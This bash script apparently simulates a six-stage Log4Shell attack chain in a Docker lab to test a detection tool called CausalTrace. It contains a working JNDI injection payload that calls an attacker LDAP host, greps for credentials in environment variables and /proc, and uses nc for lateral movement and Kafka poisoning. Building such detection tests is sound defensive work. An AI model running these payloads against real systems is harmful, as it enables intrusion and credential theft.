#!/bin/bash
# log4shell_chain.sh — 6-stage Log4Shell attack chain
#
# Demonstrates a realistic multi-stage attack that:
# - Exploits Log4j 2.14.1 JNDI injection in webapp-a
# - Performs internal recon from compromised container
# - Moves laterally to payment-service
# - Harvests credentials
# - Poisons Kafka
# - Attempts second exploit via Elasticsearch
#
# CausalTrace should detect this via:
# Stage 1: Novel-edge detection (webapp-a → attacker-ldap:1389 not calibrated)
# Stage 2: Behavior bit detection (sensitive file access)
# Stage 3: Novel-edge (webapp-a → payment-service on non-standard port)
# Stage 4: Behavior bit (sensitive file/env access)
# Stage 5: Novel-edge (webapp-a → kafka direct)
# Stage 6: Second JNDI trigger
#
# Industry tools (Falco/Tetragon) miss ALL stages because:
# - JNDI lookup = socket+connect (normal JVM syscalls)
# - Class loading = read+mmap (normal JVM syscalls)
# - No single syscall is individually anomalous

LOG_DIR="${1:-results/run_latest/production_detection}"
mkdir -p "$LOG_DIR"

echo "============================================================"
echo "  Log4Shell Attack Chain — 6 Stages"
echo "  $(date)"
echo "============================================================"

# ── STAGE 1: RCE Trigger via JNDI injection ──────────────────────
echo ""
echo "[STAGE 1] $(date +%s%N) — JNDI injection via User-Agent header"
echo "  curl with malicious X-Api-Version → webapp-a logs it → Log4j processes JNDI"
echo "  webapp-a makes TCP to attacker-ldap:1389 (NOVEL EDGE — port 389 was calibrated, 1389 was not)"

STAGE1_START=$(date +%s%N)
curl -s -H 'X-Api-Version: ${jndi:ldap://172.22.0.25:1389/exploit}' \
    http://localhost:9080/ 2>/dev/null || true
STAGE1_END=$(date +%s%N)

echo "  Latency: $(( (STAGE1_END - STAGE1_START) / 1000000 )) ms"
echo "  Expected detection: Tier3 novel-edge (webapp-a → 172.22.0.25:1389)"

sleep 5

# ── STAGE 2: Internal recon from compromised webapp-a ─────────────
echo ""
echo "[STAGE 2] $(date +%s%N) — Internal reconnaissance"
echo "  Reading /proc/net/tcp, environment variables, API gateway services"

STAGE2_START=$(date +%s%N)
docker exec ct-prod-webapp-a bash -c '
    cat /proc/net/tcp 2>/dev/null | head -20
    env | grep -i "pass\|secret\|key\|db\|postgres" 2>/dev/null
    curl -s http://172.22.0.13:8000/ 2>/dev/null
' > "$LOG_DIR/stage2_recon.log" 2>&1
STAGE2_END=$(date +%s%N)

echo "  Latency: $(( (STAGE2_END - STAGE2_START) / 1000000 )) ms"
echo "  Expected detection: BIT_SENSITIVE_FILE (if /proc/* read triggers handler)"

sleep 3

# ── STAGE 3: Lateral movement to payment-service ─────────────────
echo ""
echo "[STAGE 3] $(date +%s%N) — Lateral movement: webapp-a → payment-service"
echo "  Connecting to payment-service management port (non-standard, uncalibrated)"

STAGE3_START=$(date +%s%N)
docker exec ct-prod-webapp-a bash -c '
    nc -w3 172.22.0.17 8443 2>/dev/null || true
    curl -s http://172.22.0.17:8080/actuator/env 2>/dev/null || true
' > "$LOG_DIR/stage3_lateral.log" 2>&1
STAGE3_END=$(date +%s%N)

echo "  Latency: $(( (STAGE3_END - STAGE3_START) / 1000000 )) ms"
echo "  Expected detection: Tier3 novel-edge (webapp-a → payment:8443 not calibrated)"

sleep 3

# ── STAGE 4: Credential harvest from payment-service ─────────────
echo ""
echo "[STAGE 4] $(date +%s%N) — Credential harvest from payment-service"
echo "  Reading environment variables containing DB passwords and API keys"

STAGE4_START=$(date +%s%N)
docker exec ct-prod-payment bash -c '
    env | grep -i "postgres\|db_pass\|payment_key\|secret"
    cat /proc/self/environ 2>/dev/null | tr "\0" "\n" | grep -i "cred\|secret\|key"
' > "$LOG_DIR/stage4_creds.log" 2>&1
STAGE4_END=$(date +%s%N)

echo "  Latency: $(( (STAGE4_END - STAGE4_START) / 1000000 )) ms"
echo "  Expected detection: BIT_SENSITIVE_FILE + sheaf bigram anomaly"

sleep 3

# ── STAGE 5: Kafka poisoning ─────────────────────────────────────
echo ""
echo "[STAGE 5] $(date +%s%N) — Kafka poisoning (persistence)"
echo "  Publishing malicious message directly to Kafka (novel edge)"

STAGE5_START=$(date +%s%N)
docker exec ct-prod-webapp-a bash -c '
    echo "MALICIOUS_PAYLOAD_$(date +%s)" | nc -w3 172.22.0.23 9092 2>/dev/null || true
' > "$LOG_DIR/stage5_kafka.log" 2>&1
STAGE5_END=$(date +%s%N)

echo "  Latency: $(( (STAGE5_END - STAGE5_START) / 1000000 )) ms"
echo "  Expected detection: Tier3 novel-edge (webapp-a → kafka:9092 not calibrated)"

sleep 3

# ── STAGE 6: Elasticsearch exfiltration via second Log4j surface ──
echo ""
echo "[STAGE 6] $(date +%s%N) — Second JNDI exploit via webapp-a direct (port 9081)"
echo "  Second JNDI trigger to confirm detection consistency"

STAGE6_START=$(date +%s%N)
curl -s -H 'X-Api-Version: ${jndi:ldap://172.22.0.25:1389/exploit}' \
    http://localhost:9081/ 2>/dev/null || true
STAGE6_END=$(date +%s%N)

echo "  Latency: $(( (STAGE6_END - STAGE6_START) / 1000000 )) ms"
echo "  Expected detection: Tier3 novel-edge (elasticsearch → attacker-ldap:1389)"

echo ""
echo "============================================================"
echo "  ATTACK CHAIN COMPLETE — $(date)"
echo "============================================================"
echo ""
echo "Summary:"
echo "  Stages executed: 6"
echo "  Primary exploit: Log4j 2.14.1 JNDI injection (CVE-2021-44228)"
echo "  Attack surface: webapp-a (port 9080/9081), payment-service, elasticsearch"
echo "  Novel edges created: webapp→attacker:1389, webapp→payment:8443, webapp→kafka:9092"
echo ""
echo "Why Falco/Tetragon miss this:"
echo "  - JNDI lookup = socket(AF_INET) + connect() — normal JVM network call"
echo "  - Class loading = openat() + read() + mmap() — normal JVM class loading"
echo "  - No individual syscall is anomalous"
echo "  - Cross-container correlation required (only CausalTrace has this)"
